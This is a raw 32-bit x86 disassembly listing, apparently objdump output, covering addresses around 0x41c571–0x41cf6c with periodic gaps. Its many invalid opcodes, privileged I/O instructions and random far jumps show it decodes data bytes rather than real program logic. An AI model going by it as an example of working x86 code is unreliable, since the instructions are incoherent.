  41c571:	test   eax,0x4b7b72a0
  41c576:	cmp    BYTE PTR [ecx+edx*8],0xb5
  41c57a:	pushf  
  41c57b:	sub    ah,al
  41c57d:	xchg   esp,eax
  41c57e:	call   0x8cdb:0x4e707832
  41c585:	cmp    edx,DWORD PTR [edi-0x38e9a187]
  41c58b:	adc    cl,0x7e
  41c58e:	daa    
  41c58f:	ret    
  41c590:	inc    ebx
  41c591:	sbb    BYTE PTR [ecx+0x72],0x30
  41c595:	outs   dx,BYTE PTR ds:[esi]
  41c596:	aam    0x60
  41c598:	xor    DWORD PTR [eax+0x40],esi
  41c59b:	lea    edx,[esi+ebp*2+0x7672185f]
  41c5a2:	inc    ebx
  41c5a3:	jge    0x41c606
  41c5a5:	xchg   esi,eax
  41c5a6:	xor    eax,0x9cfce302
  41c5ab:	xchg   ecx,eax
  41c5ac:	rcl    DWORD PTR [esi-0x41],0xee
  41c5b0:	xor    dl,cl
  41c5b2:	in     al,0xbb
  41c5b4:	xchg   esp,eax
  41c5b5:	out    dx,al
  41c5b6:	stos   DWORD PTR es:[edi],eax
  41c5b7:	mov    DWORD PTR [esi],ebx
  41c5b9:	(bad)  
  41c5ba:	jg     0x41c568
  41c5bc:	js     0x41c636
  41c5be:	add    esp,esi
  41c5c0:	dec    eax
  41c5c1:	mov    ?,WORD PTR [edi-0x3b]
  41c5c4:	cld    
  41c5c5:	adc    eax,0x5fe759e5
  41c5ca:	das    
  41c5cb:	das    
  41c5cc:	je     0x41c5d6
  41c5ce:	pop    esp
  41c5cf:	shl    BYTE PTR [esi],cl
  41c5d1:	retf   0xa157
  41c5d4:	jns    0x41c5e3
  41c5d6:	fst    DWORD PTR [eax+0x558c2055]
  41c5dc:	aaa    
  41c5dd:	xchg   ebx,eax
  41c5de:	pop    esp
  41c5df:	fsubr  st,st(4)
  41c5e1:	inc    esi
  41c5e2:	jl     0x41c5b6
  41c5e4:	jle    0x41c604
  41c5e6:	pop    edi
  41c5e7:	test   DWORD PTR [esi],esp
  41c5e9:	cli    
  41c5ea:	outs   dx,DWORD PTR ds:[esi]
  41c5eb:	push   ecx
  41c5ec:	call   0x41c5f1
	...
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x310d:0x6358a914
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	inc    DWORD PTR [eax]
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	xchg   ebp,eax
  41c66f:	addr16 addr16 pop edx
  41c672:	xor    DWORD PTR [ebp-0x7feae27],esi
  41c678:	jnp    0x41c65d
  41c67a:	dec    eax
  41c67b:	xor    dl,bh
  41c67d:	dec    edi
  41c67e:	pop    ebp
  41c67f:	fidivr WORD PTR [ecx+0x30]
  41c682:	fs push cs
  41c684:	(bad)  
  41c685:	aas    
  41c686:	repz push 0xd8774906
  41c68c:	xor    al,0x70
  41c68e:	add    al,0xde
  41c690:	or     eax,0x26e68783
  41c695:	jmp    0x7c6c066b
  41c69a:	ret    0xd6a
  41c69d:	jle    0x41c700
  41c69f:	pop    esi
  41c6a0:	adc    eax,0x9c6c8699
  41c6a5:	cmp    al,0xff
  41c6a7:	rol    DWORD PTR [esi-0x56],cl
  41c6aa:	mov    esp,0xa4b9da46
  41c6af:	mov    ecx,0x624a158
  41c6b4:	fbstp  TBYTE PTR [esi]
  41c6b6:	(bad)  [ecx-0x8b77f8b]
  41c6bc:	and    BYTE PTR [esi+0x8],0x17
  41c6c0:	jecxz  0x41c6ca
  41c6c2:	pop    edx
  41c6c3:	mov    ch,0xd0
  41c6c5:	cmc    
  41c6c6:	nop
  41c6c7:	jl     0x41c6a7
  41c6c9:	daa    
  41c6ca:	lea    edx,[ebx-0x53]
  41c6cd:	mov    BYTE PTR [eax+0x665143ba],dh
  41c6d3:	popa   
  41c6d4:	iret   
  41c6d5:	ja     0x41c741
  41c6d7:	rcl    BYTE PTR [edi+0x71],cl
  41c6da:	rcl    BYTE PTR [eax+0x6dac9ff6],1
  41c6e0:	(bad)  
  41c6e1:	mov    eax,0x7bfbb4e1
  41c6e6:	add    BYTE PTR [esi],0x17
  41c6e9:	repz mov eax,ds:0x1d02879f
  41c6ef:	jge    0x41c749
  41c6f1:	sahf   
  41c6f2:	cmc    
  41c6f3:	inc    ebp
  41c6f4:	in     al,0x8b
  41c6f6:	cmp    BYTE PTR [ecx-0xf],bl
  41c6f9:	push   ecx
  41c6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6fb:	mov    al,ds:0x73e0a56b
  41c700:	push   0x5e943ac2
  41c705:	push   eax
  41c706:	(bad)  
  41c708:	loop   0x41c743
  41c70a:	pop    ebx
  41c70b:	jbe    0x41c6c4
  41c70d:	and    ah,BYTE PTR [edx+0x57]
  41c710:	fdiv   DWORD PTR [eax+0x76]
  41c713:	addr16 hlt 
  41c715:	loopne 0x41c774
  41c717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c718:	ret    0x330d
  41c71b:	cmp    BYTE PTR [edx+0x2c],dh
  41c71e:	sbb    al,0x83
  41c720:	or     bh,bh
  41c722:	mov    eax,0xb3c5be49
  41c727:	xchg   esp,eax
  41c728:	push   edx
  41c729:	daa    
  41c72a:	pop    eax
  41c72b:	jae    0x41c794
  41c72d:	shr    DWORD PTR [edi],0x42
  41c730:	mov    ebx,0x83adb1ca
  41c735:	ror    al,cl
  41c737:	jle    0x41c798
  41c739:	adc    ebx,DWORD PTR [ecx]
  41c73b:	adc    edx,ebx
  41c73d:	in     eax,dx
  41c73e:	inc    esi
  41c73f:	pop    ebp
  41c740:	scas   eax,DWORD PTR es:[edi]
  41c741:	neg    edx
  41c743:	xor    dh,BYTE PTR ds:0xeb65e938
  41c749:	ins    BYTE PTR es:[edi],dx
  41c74a:	(bad)  
  41c74b:	ficom  DWORD PTR [eax+eax*1-0x74]
  41c74f:	adc    bl,ah
  41c751:	cmc    
  41c752:	clc    
  41c753:	lock push eax
  41c755:	dec    edx
  41c756:	loope  0x41c6df
  41c758:	pushaw 
  41c75a:	jl     0x41c7c3
  41c75c:	pop    esp
  41c75d:	cmc    
  41c75e:	shr    DWORD PTR [ecx],0x75
  41c761:	push   0xe24c65b5
  41c766:	in     al,dx
  41c767:	mov    cl,0x9
  41c769:	dec    ebx
  41c76a:	es das 
  41c76c:	pop    es
	...
  41c7d5:	add    dl,bl
  41c7d7:	add    edx,eax
  41c7d9:	xchg   bl,bl
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	and    eax,0xcbe4fcd
  41c7e7:	xor    al,BYTE PTR [ecx]
  41c7e9:	add    bh,bh
  41c7eb:	add    BYTE PTR [eax],al
  41c7ed:	add    BYTE PTR [esi*8-0x7eb85d47],dl
  41c7f4:	add    BYTE PTR [edi-0x29da574d],ch
  41c7fa:	mov    cl,0xaf
  41c7fc:	and    BYTE PTR [ebx+0x4b],cl
  41c7ff:	std    
  41c800:	mov    edi,0x92c80858
  41c805:	(bad)  
  41c807:	call   0x3eb8:0xab206f05
  41c80e:	cwde   
  41c80f:	jl     0x41c88a
  41c811:	or     ch,BYTE PTR [edx+edx*4+0x14d37d60]
  41c818:	adc    DWORD PTR [ebp-0x1f5c4dfa],ecx
  41c81e:	sahf   
  41c81f:	or     eax,0x2af769a5
  41c824:	lahf   
  41c825:	retf   0x70df
  41c828:	mov    edi,ss
  41c82a:	xor    ebx,DWORD PTR [ecx]
  41c82c:	jo     0x41c82f
  41c82e:	mov    gs,WORD PTR [eax]
  41c830:	clc    
  41c831:	pop    es
  41c832:	loopne 0x41c824
  41c834:	data16 shl BYTE PTR [ebp+0x3a],0x82
  41c839:	xchg   ebp,eax
  41c83a:	cmp    dl,BYTE PTR [eax]
  41c83c:	mov    ecx,edi
  41c83e:	ret    0x564d
  41c841:	mov    ds:0xd7713717,al
  41c846:	stc    
  41c847:	add    BYTE PTR [esi],0x27
  41c84a:	fstp   DWORD PTR [ecx+0xa]
  41c84d:	in     al,dx
  41c84e:	scas   eax,DWORD PTR es:[edi]
  41c84f:	mov    ds:0x746aaedc,al
  41c854:	shl    DWORD PTR [edi],cl
  41c856:	pop    ebp
  41c857:	jecxz  0x41c7eb
  41c859:	mov    ebx,0xb2181ccb
  41c85e:	outs   dx,DWORD PTR ds:[esi]
  41c85f:	addr16 mov dh,0x2e
  41c862:	xchg   ebp,eax
  41c863:	xor    DWORD PTR [edx+0x7fa99d05],0xffffffcf
  41c86a:	arpl   WORD PTR [edx+eax*4],ax
  41c86d:	mov    edx,0x6f31c780
  41c872:	test   DWORD PTR [eax-0x80],eax
  41c875:	push   esi
  41c876:	cld    
  41c877:	inc    ecx
  41c878:	(bad)  
  41c879:	popf   
  41c87a:	adc    BYTE PTR [ecx-0xd],dl
  41c87d:	jo     0x41c875
  41c87f:	push   esp
  41c880:	xor    ebp,ebp
  41c882:	mov    ebp,0xbc77d7a7
  41c887:	pop    edx
  41c888:	into   
  41c889:	mov    ds:0x857d41bc,al
  41c88e:	add    esp,DWORD PTR [edx+0x5e50e71e]
  41c894:	xor    BYTE PTR [ebp-0x73070cdf],bh
  41c89a:	or     eax,DWORD PTR [edx+eiz*1+0x23]
  41c89e:	popa   
  41c89f:	pop    ebp
  41c8a0:	jnp    0x41c866
  41c8a2:	(bad)  
  41c8a4:	(bad)  
  41c8a5:	cld    
  41c8a6:	pop    eax
  41c8a7:	jmp    0x41c8c3
  41c8a9:	cld    
  41c8aa:	stos   BYTE PTR es:[edi],al
  41c8ab:	dec    edx
  41c8ac:	push   DWORD PTR [eax]
  41c8ae:	xchg   ecx,eax
  41c8af:	push   esp
  41c8b0:	leave  
  41c8b1:	popa   
  41c8b2:	arpl   WORD PTR [ebp+0x50],dx
  41c8b5:	data16 mov bl,0xd9
  41c8b8:	push   eax
  41c8b9:	push   eax
  41c8ba:	push   es
  41c8bb:	or     ebx,DWORD PTR [esi+0x15]
  41c8be:	adc    al,0xa
  41c8c0:	mov    edx,0xab37178f
  41c8c5:	jmp    0xa4cd:0xe4d7c20b
  41c8cc:	leave  
  41c8cd:	or     bl,dl
  41c8cf:	inc    eax
  41c8d0:	fcom   QWORD PTR [ebx-0x58]
  41c8d3:	xor    DWORD PTR [ebp-0x619e0c34],ecx
  41c8d9:	add    BYTE PTR ds:0x7cbaaac3,bh
  41c8df:	aad    0xb4
  41c8e1:	(bad)  
  41c8e2:	push   ds
  41c8e3:	sar    bh,1
  41c8e5:	(bad)  
  41c8e6:	sub    al,0x10
  41c8e8:	test   BYTE PTR [ebp+0xad4411],0x0
	...
  41c953:	add    BYTE PTR [eax],al
  41c955:	add    BYTE PTR [ebx+0x34],ah
  41c958:	lods   eax,DWORD PTR ds:[esi]
  41c959:	xor    al,0xff
  41c95b:	mov    ebp,0x291877fb
  41c960:	cmp    eax,DWORD PTR [ecx]
  41c962:	dec    ebp
  41c963:	(bad)  
  41c964:	pop    edi
  41c965:	pop    es
  41c966:	or     esi,DWORD PTR [ebx]
  41c968:	add    DWORD PTR [eax],eax
  41c96a:	inc    DWORD PTR [eax]
  41c96c:	add    BYTE PTR [eax],al
  41c96e:	dec    esp
  41c96f:	pop    ds
  41c970:	pop    ebp
  41c971:	shl    ebx,1
  41c973:	aas    
  41c974:	inc    eax
  41c975:	mov    BYTE PTR [esi],cl
  41c977:	mov    bh,0x82
  41c979:	or     ah,al
  41c97b:	xchg   edi,eax
  41c97c:	jae    0x41c95d
  41c97e:	mov    cl,dh
  41c980:	lea    ebp,[ebx+0x5c]
  41c983:	push   ebx
  41c984:	and    al,0xcc
  41c986:	inc    eax
  41c987:	mov    DWORD PTR [edi+eax*1],esi
  41c98a:	out    0x4e,al
  41c98c:	mov    dl,0x15
  41c98e:	in     eax,0xf0
  41c990:	fcomip st,st(7)
  41c992:	leave  
  41c993:	mov    ch,0xb3
  41c995:	aad    0x64
  41c997:	das    
  41c998:	xor    edi,ebx
  41c99a:	(bad)  
  41c99b:	cmp    ebx,DWORD PTR [esp+edi*8]
  41c99e:	out    0x31,al
  41c9a0:	icebp  
  41c9a1:	leave  
  41c9a2:	push   edx
  41c9a3:	jae    0x41c93a
  41c9a5:	push   eax
  41c9a6:	lds    edi,FWORD PTR [esi+eiz*8+0x78eadd45]
  41c9ad:	cwde   
  41c9ae:	pop    ebx
  41c9af:	rol    DWORD PTR [esp+edi*1-0x40],0x13
  41c9b4:	or     esp,DWORD PTR [ecx+0x602543e5]
  41c9ba:	pop    esi
  41c9bb:	add    BYTE PTR [edx+ebx*8],0x57
  41c9bf:	cmp    DWORD PTR [ecx-0x51],0xffffff8f
  41c9c3:	ins    DWORD PTR es:[edi],dx
  41c9c4:	mov    dl,0xeb
  41c9c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9c7:	ja     0x41ca15
  41c9c9:	or     al,0x56
  41c9cb:	ret    0x21e6
  41c9ce:	xor    DWORD PTR [ebx-0x4e],eax
  41c9d1:	es test al,ch
  41c9d4:	cmp    eax,0x6439531f
  41c9d9:	shr    DWORD PTR [esi],1
  41c9db:	mov    cl,0xae
  41c9dd:	aam    0xf4
  41c9df:	mov    ah,0xda
  41c9e1:	cli    
  41c9e2:	xchg   edi,eax
  41c9e3:	sti    
  41c9e4:	add    eax,0x4292880a
  41c9e9:	stos   DWORD PTR es:[edi],eax
  41c9ea:	xor    ebp,DWORD PTR [edi-0x30]
  41c9ed:	adc    al,0x60
  41c9ef:	jne    0x41c9d1
  41c9f1:	mov    al,0xe6
  41c9f3:	jge    0x41ca5d
  41c9f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9f7:	test   BYTE PTR [eax],bl
  41c9f9:	rol    DWORD PTR [ebx-0x4710b8b7],1
  41c9ff:	dec    edx
  41ca00:	fistp  DWORD PTR [edi]
  41ca02:	fs lahf 
  41ca04:	test   edi,0x9a03e591
  41ca0a:	push   edx
  41ca0b:	aad    0xd9
  41ca0d:	sbb    ebx,ebx
  41ca0f:	xchg   ebx,eax
  41ca10:	and    ebx,ebp
  41ca12:	or     DWORD PTR [eax-0x3f],edx
  41ca15:	(bad)  
  41ca17:	inc    eax
  41ca18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca19:	scas   al,BYTE PTR es:[edi]
  41ca1a:	pop    ss
  41ca1b:	in     al,0x4
  41ca1d:	bound  ebp,QWORD PTR [ecx-0x70]
  41ca20:	int    0x3e
  41ca22:	push   0x9295c785
  41ca27:	xchg   edx,eax
  41ca28:	test   dh,ch
  41ca2a:	sti    
  41ca2b:	dec    ecx
  41ca2c:	and    esi,DWORD PTR [esi-0x44a53664]
  41ca32:	stos   BYTE PTR es:[edi],al
  41ca33:	ds xchg esi,eax
  41ca35:	gs lock ja 0x41ca04
  41ca39:	mov    dl,0x5
  41ca3b:	ror    ebp,cl
  41ca3d:	mov    DWORD PTR [edi-0x77],0x174cdf18
  41ca44:	xor    eax,0x65164410
  41ca49:	ja     0x41ca54
  41ca4b:	jecxz  0x41ca72
  41ca4d:	(bad)  
  41ca4e:	shl    cl,1
  41ca50:	inc    edx
  41ca51:	test   eax,0x31b998b7
  41ca56:	(bad)  
  41ca57:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41ca59:	mov    dl,BYTE PTR [edx+0xd4cde22]
  41ca5f:	aaa    
  41ca60:	dec    ebp
  41ca61:	out    0x51,eax
  41ca63:	mov    edx,0xfcc97801
  41ca68:	cli    
  41ca69:	xor    BYTE PTR [ecx+edx*2],al
  41ca6c:	push   ss
	...
  41cad5:	add    al,dh
  41cad7:	retf   0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	and    ch,cl
  41cae4:	sbb    esi,eax
  41cae6:	or     dh,BYTE PTR [ecx+eax*1]
  41cae9:	add    bh,bh
  41caeb:	add    BYTE PTR [eax],al
  41caed:	add    ah,al
  41caef:	and    DWORD PTR [eax],esp
  41caf1:	fst    QWORD PTR [eax+esi*8-0x6b9948bb]
  41caf8:	les    esi,FWORD PTR [eax-0x32]
  41cafb:	inc    ebp
  41cafc:	pop    edi
  41cafd:	pop    es
  41cafe:	pop    es
  41caff:	inc    ebx
  41cb00:	popa   
  41cb01:	add    al,0x92
  41cb03:	aaa    
  41cb04:	std    
  41cb05:	loope  0x41ca90
  41cb07:	and    DWORD PTR [eax],edi
  41cb09:	loop   0x41cb4e
  41cb0b:	inc    ecx
  41cb0c:	bound  ebx,QWORD PTR [ebx-0x1cb86cca]
  41cb12:	mov    cl,0x7f
  41cb14:	leave  
  41cb15:	fst    st(5)
  41cb17:	push   0xffffffbc
  41cb19:	stos   DWORD PTR es:[edi],eax
  41cb1a:	adc    DWORD PTR [edx],esp
  41cb1c:	sub    eax,0xc63f1612
  41cb21:	out    dx,eax
  41cb22:	xchg   ebp,eax
  41cb23:	mov    ecx,0xebed1b0f
  41cb28:	inc    ebx
  41cb29:	push   esi
  41cb2a:	xchg   esi,eax
  41cb2b:	stos   DWORD PTR es:[edi],eax
  41cb2c:	sar    dl,0x7d
  41cb2f:	pop    es
  41cb30:	mov    edx,DWORD PTR [edi]
  41cb32:	sbb    ebx,DWORD PTR [ecx]
  41cb34:	stos   DWORD PTR es:[edi],eax
  41cb35:	or     eax,0x3367dd
  41cb3a:	retf   
  41cb3b:	jmp    0x5d20:0xb63310ed
  41cb42:	out    dx,al
  41cb43:	cmc    
  41cb44:	sub    al,0x34
  41cb46:	mov    ch,0x7e
  41cb48:	retf   0x21dc
  41cb4b:	xor    eax,0x34cdbcb1
  41cb50:	les    ecx,FWORD PTR [edi-0x6b]
  41cb53:	(bad)  
  41cb55:	xchg   ecx,eax
  41cb56:	mov    eax,0xebebd7d7
  41cb5b:	cmp    DWORD PTR [ebx-0x34834454],edx
  41cb61:	stos   BYTE PTR es:[edi],al
  41cb62:	push   edi
  41cb63:	and    al,0x54
  41cb65:	jne    0x41cafa
  41cb67:	xlat   BYTE PTR ds:[ebx]
  41cb68:	(bad)  
  41cb69:	pusha  
  41cb6a:	mov    fs,WORD PTR [ecx+0x60]
  41cb6d:	sar    BYTE PTR [edx+0x336c542a],1
  41cb73:	cmp    DWORD PTR [edi],0xf24b03b4
  41cb79:	sbb    ah,ah
  41cb7b:	push   ebp
  41cb7c:	int    0x5d
  41cb7e:	fild   QWORD PTR [esi+0x67]
  41cb81:	int3   
  41cb82:	push   ds
  41cb83:	xchg   ebx,eax
  41cb84:	dec    eax
  41cb85:	sub    edi,edi
  41cb87:	loopne 0x41cbaa
  41cb89:	push   ebp
  41cb8a:	inc    edx
  41cb8b:	xor    DWORD PTR [eax],0x6f88fb68
  41cb91:	cmp    eax,DWORD PTR [edi]
  41cb93:	push   edi
  41cb94:	mov    cl,0xb5
  41cb96:	mov    ebp,0x54deb8f8
  41cb9b:	and    BYTE PTR [edx],ch
  41cb9d:	pop    ebp
  41cb9e:	jo     0x41cb98
  41cba0:	and    DWORD PTR [ecx-0x36463500],edi
  41cba6:	ror    BYTE PTR [esi-0x525591af],cl
  41cbac:	repz mov eax,0x502e5481
  41cbb2:	push   esp
  41cbb3:	test   al,0xaf
  41cbb6:	inc    edi
  41cbb7:	fwait
  41cbb8:	and    esp,0xffffffb0
  41cbbb:	xchg   esi,eax
  41cbbc:	jns    0x41cb97
  41cbbe:	mov    bl,0x55
  41cbc0:	fiadd  DWORD PTR [edx-0x159d30c8]
  41cbc6:	call   0x395e:0x6d1c8f76
  41cbcd:	div    DWORD PTR [ebx+0x62b90085]
  41cbd3:	and    eax,0xedc35637
  41cbd8:	mov    ds:0x9ea1a12a,eax
  41cbdd:	cwde   
  41cbde:	xor    eax,0x6396b1bb
  41cbe3:	idiv   BYTE PTR [edi+0x5f]
  41cbe6:	aas    
  41cbe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbe8:	popf   
  41cbe9:	inc    ecx
  41cbea:	ret    
  41cbeb:	js     0x41cb75
	...
  41cc55:	add    BYTE PTR [ecx],ch
  41cc57:	(bad)  
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0xdd6b7922
  41cc65:	adc    ecx,DWORD PTR [ecx]
  41cc67:	xor    eax,0xff0001
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	cli    
  41cc6f:	or     DWORD PTR [ecx+0x22],0x20db23fa
  41cc76:	sbb    DWORD PTR [edx+0x3b52b612],ebx
  41cc7c:	out    0x48,al
  41cc7e:	leave  
  41cc7f:	push   esi
  41cc80:	pop    esp
  41cc81:	into   
  41cc82:	bound  edi,QWORD PTR [edi+0x5d1888bc]
  41cc88:	sub    al,0x34
  41cc8a:	mov    dl,0x7f
  41cc8c:	loopne 0x41cca9
  41cc8e:	add    edx,DWORD PTR [edi+0x28]
  41cc91:	test   eax,0xd0906b41
  41cc96:	scas   eax,DWORD PTR es:[edi]
  41cc97:	sbb    dh,BYTE PTR [bx+di]
  41cc9a:	and    edi,ebx
  41cc9c:	dec    edx
  41cc9d:	mov    eax,0x507b1a73
  41cca2:	out    dx,al
  41cca3:	push   eax
  41cca4:	mov    ah,0xe4
  41cca6:	ret    
  41cca7:	test   DWORD PTR [ebx+0x2abf6f8b],ebx
  41ccad:	mov    dl,0x89
  41ccaf:	mov    al,ds:0x5a47d23a
  41ccb4:	in     eax,0x2e
  41ccb6:	cdq    
  41ccb7:	lods   al,BYTE PTR ds:[esi]
  41ccb8:	pop    esi
  41ccb9:	xor    bl,al
  41ccbb:	(bad)  
  41ccbc:	loope  0x41cd29
  41ccbe:	cld    
  41ccbf:	and    bh,BYTE PTR [eax+ecx*4]
  41ccc2:	sbb    BYTE PTR [edi-0x2],ch
  41ccc5:	test   BYTE PTR [ecx],bh
  41ccc7:	push   es
  41ccc8:	mov    bh,0x1e
  41ccca:	stos   DWORD PTR es:[edi],eax
  41cccb:	addr16 inc esi
  41cccd:	ja     0x41ccb6
  41cccf:	imul   eax,DWORD PTR [ecx+0x7b],0x6c
  41ccd3:	outs   dx,DWORD PTR ds:[esi]
  41ccd4:	call   0x9e0:0xebe65da7
  41ccdb:	nop
  41ccdc:	test   dh,ah
  41ccde:	cli    
  41ccdf:	jno    0x41cce5
  41cce1:	jns    0x41ccc9
  41cce3:	sbb    edi,ebp
  41cce5:	push   es
  41cce6:	cwde   
  41cce7:	test   BYTE PTR [edx+ebx*1+0x4],dh
  41cceb:	dec    ecx
  41ccec:	mov    ds:0x91369ee8,eax
  41ccf1:	inc    ecx
  41ccf2:	cli    
  41ccf3:	ror    DWORD PTR [edx-0x40],1
  41ccf6:	xchg   ebx,eax
  41ccf7:	sub    BYTE PTR [edx+0x566745c2],al
  41ccfd:	aam    0x7a
  41ccff:	pop    esp
  41cd00:	ins    DWORD PTR es:[edi],dx
  41cd01:	or     BYTE PTR [ebx+edx*2],0xf6
  41cd05:	or     al,0x29
  41cd07:	ror    DWORD PTR [ebp+0x16fc89b1],cl
  41cd0d:	xor    ch,0x28
  41cd10:	in     eax,dx
  41cd11:	sub    edx,DWORD PTR [edx+0x78]
  41cd14:	xor    DWORD PTR [ebx-0x34],0xffffffad
  41cd18:	inc    ecx
  41cd19:	addr16 mov eax,0x7d596c4a
  41cd1f:	jbe    0x41cca3
  41cd21:	in     eax,0xe2
  41cd23:	xchg   ebp,eax
  41cd24:	mov    esi,0xc1838981
  41cd29:	xor    DWORD PTR [esi],eax
  41cd2b:	idiv   BYTE PTR [ecx-0x64ca00e8]
  41cd31:	mov    ecx,0xc32805f7
  41cd36:	push   edi
  41cd37:	int    0xb9
  41cd39:	inc    ecx
  41cd3a:	adc    BYTE PTR [edi-0x2835984],ah
  41cd40:	shl    DWORD PTR [ecx],1
  41cd42:	add    eax,0xf8fe3e05
  41cd47:	adc    ebp,DWORD PTR [eax+0x54199118]
  41cd4d:	bound  eax,QWORD PTR [ebx]
  41cd4f:	call   0xae4f:0x429de118
  41cd56:	cmp    eax,edx
  41cd58:	push   cs
  41cd59:	shl    BYTE PTR [ecx+0x5f],1
  41cd5c:	(bad)  
  41cd5d:	in     al,0xad
  41cd5f:	sub    BYTE PTR [esi+eax*1],dl
  41cd62:	cmp    bl,bh
  41cd64:	(bad)  
  41cd65:	jge    0x41cd91
  41cd67:	push   0xdccbdb45
  41cd6c:	lds    eax,FWORD PTR [eax]
	...
  41cdd6:	pusha  
  41cdd7:	cdq    
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	mov    DWORD PTR [edi],ecx
  41cde4:	push   eax
  41cde5:	sahf   
  41cde6:	or     BYTE PTR [esi],dh
  41cde8:	add    DWORD PTR [eax],eax
  41cdea:	inc    DWORD PTR [eax]
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	mov    cl,0x4d
  41cdf0:	imul   ebx,DWORD PTR [edx+0x3761b9e4],0xc3dc39dd
  41cdfa:	jns    0x41cdf1
  41cdfc:	or     al,0xc0
  41cdfe:	adc    edx,ecx
  41ce00:	test   DWORD PTR [edx-0x74],edi
  41ce03:	mov    ch,0x18
  41ce05:	loopne 0x41ce36
  41ce07:	sub    DWORD PTR ds:0x7f1c0122,esi
  41ce0d:	ins    DWORD PTR es:[edi],dx
  41ce0e:	push   eax
  41ce0f:	test   DWORD PTR [esi+0x7f],0x9c86a99e
  41ce16:	pushf  
  41ce17:	mov    ds:0x3dff8c21,eax
  41ce1c:	cmp    al,0x6b
  41ce1e:	js     0x41ce02
  41ce20:	gs cwde 
  41ce22:	xchg   esi,eax
  41ce23:	mov    cl,0xbb
  41ce25:	pop    esp
  41ce26:	test   eax,0x7ee08f9b
  41ce2b:	out    0xbf,al
  41ce2d:	sahf   
  41ce2e:	test   DWORD PTR [eax],0x839e009c
  41ce34:	repz add eax,0x70cb11ce
  41ce3a:	out    dx,eax
  41ce3b:	fdivrp st(2),st
  41ce3d:	fistp  QWORD PTR [edi+0x304d5f4c]
  41ce43:	cli    
  41ce44:	ja     0x41cded
  41ce46:	dec    eax
  41ce47:	scas   eax,DWORD PTR es:[edi]
  41ce48:	and    DWORD PTR [eax+ebp*8+0xa3830f4],eax
  41ce4f:	sbb    eax,DWORD PTR [ebx]
  41ce51:	loop   0x41ce1e
  41ce53:	xchg   ecx,eax
  41ce54:	fsincos 
  41ce56:	push   ebx
  41ce57:	out    0x99,al
  41ce59:	rol    DWORD PTR [eax+0x13e02335],0x55
  41ce60:	mov    al,0xde
  41ce62:	(bad)  
  41ce63:	push   0xffffffe4
  41ce65:	mov    ch,0xd0
  41ce67:	cmp    DWORD PTR [edx],eax
  41ce69:	data16 mov bl,0xdc
  41ce6c:	dec    esi
  41ce6d:	mov    esp,0x40a0a8e2
  41ce72:	and    al,0xe0
  41ce74:	and    al,0x80
  41ce76:	int    0x9
  41ce78:	arpl   WORD PTR [ecx+0x54f1ec73],bx
  41ce7e:	int    0x8d
  41ce80:	jmp    0x41cea6
  41ce82:	mov    cl,0x1d
  41ce84:	sahf   
  41ce85:	mov    eax,ds:0x18c47624
  41ce8a:	int    0x71
  41ce8c:	xchg   ebx,eax
  41ce8d:	and    BYTE PTR [ecx],bh
  41ce8f:	retf   
  41ce90:	push   ecx
  41ce91:	arpl   WORD PTR [eax-0x2c],bp
  41ce94:	in     al,dx
  41ce95:	xchg   ebx,eax
  41ce96:	(bad)  
  41ce97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce98:	or     edi,ebp
  41ce9a:	arpl   WORD PTR [edx-0x3e],si
  41ce9d:	in     al,0xf8
  41ce9f:	mov    cs,WORD PTR [ecx-0x55]
  41cea2:	jo     0x41ce6d
  41cea4:	int    0x45
  41cea6:	sbb    BYTE PTR [ebp+0x4b],al
  41cea9:	sbb    DWORD PTR [ebp-0x20],esi
  41ceac:	mov    eax,esp
  41ceae:	test   eax,0x3d90663a
  41ceb3:	mov    eax,0x60f5783d
  41ceb8:	mov    DWORD PTR [edx],esi
  41ceba:	inc    ecx
  41cebb:	sbb    ebp,DWORD PTR [edx+0x66]
  41cebe:	icebp  
  41cebf:	cs in  al,dx
  41cec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cec2:	shl    BYTE PTR [eax+0x56],cl
  41cec5:	push   ds
  41cec6:	repz mov al,ds:0xea2c93c5
  41cecc:	jecxz  0x41ceb4
  41cece:	inc    eax
  41cecf:	leave  
  41ced0:	and    bh,BYTE PTR [eax+0x38]
  41ced3:	arpl   WORD PTR [esi-0x1d52242a],si
  41ced9:	and    al,0x28
  41cedc:	or     DWORD PTR [ebx],0xb81fea1c
  41cee2:	adc    DWORD PTR ds:0xd88849dc,edx
  41cee8:	dec    esp
  41cee9:	(bad)  
  41ceea:	daa    
  41ceeb:	lock pop ds
	...
  41cf55:	add    BYTE PTR [edi],al
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	xchg   esp,eax
  41cf63:	lods   eax,DWORD PTR ds:[esi]
  41cf64:	sub    BYTE PTR [edi+0x13707],ch
  41cf6a:	inc    DWORD PTR [eax]
  41cf6c:	add    BYTE PTR [eax],al
